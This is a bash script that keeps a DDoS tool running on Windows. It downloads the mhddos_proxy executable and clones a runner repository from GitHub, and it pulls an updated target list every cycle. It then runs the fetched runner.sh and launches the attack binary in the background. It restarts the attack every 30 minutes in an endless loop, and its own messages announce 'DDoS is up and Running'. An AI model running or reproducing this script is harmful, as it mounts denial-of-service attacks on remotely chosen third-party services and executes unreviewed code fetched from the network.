#!/bin/bash

#Just in case kill previous copy of scripts
echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with DDoS and finder"
taskkill -f -im python.exe
taskkill -f -im python3.8.exe
taskkill -f -im python3.9.exe
taskkill -f -im python3.10.exe
taskkill -f -im mhddos_proxy
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with DDoS and finder killed\033[0;0m\n"

#Installing files into correct directory
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling files into correct directories...\033[0;0m\n"
sleep 3
ulimit -Hn 16384
python -m pip install --upgrade pip
cd ~
rm -rf mhddos_proxy
rm -rf runner_for_windows
git clone https://github.com/alexnest-ua/runner_for_windows.git
curl -Lo mhddos_proxy https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_win.exe

sleep 2
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mFiles installed successfully\033[1;0m\n\n"

restart_interval="30m"


# Restart attacks and update targets list every 30 minutes
while [ 1 == 1 ]
do		
	cd ~/runner_for_windows
   	num=$(git pull origin main | grep -E -c 'Already|Уже|Вже')
   	echo "$num"   	
   	if ((num == 1));
   	then	
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date auto_mhddos_alexnest"
	else
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated auto_mhddos_alexnest"
		bash runner.sh
	fi

	cd ~
	curl -Lo mhddos_proxy https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_win.exe

	./mhddos_proxy&
	
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update in $restart_interval ...\033[1;0m"
	sleep $restart_interval
	clear
   	
   	#Just in case kill previous copy of mhddos_proxy
   	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with DDoS and finder"
   	taskkill -f -im python.exe
	taskkill -f -im python3.8.exe
	taskkill -f -im python3.9.exe
	taskkill -f -im python3.10.exe
	taskkill -f -im mhddos_proxy
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with DDoS and finder killed\033[0;0m\n"
	
   	no_ddos_sleep="$(shuf -i 1-2 -n 1)m"
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[36mSleeping $no_ddos_sleep without DDoS to let your computer cool down...\033[0m\n"
	sleep $no_ddos_sleep
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mRESTARTING\033[0m\n"
done
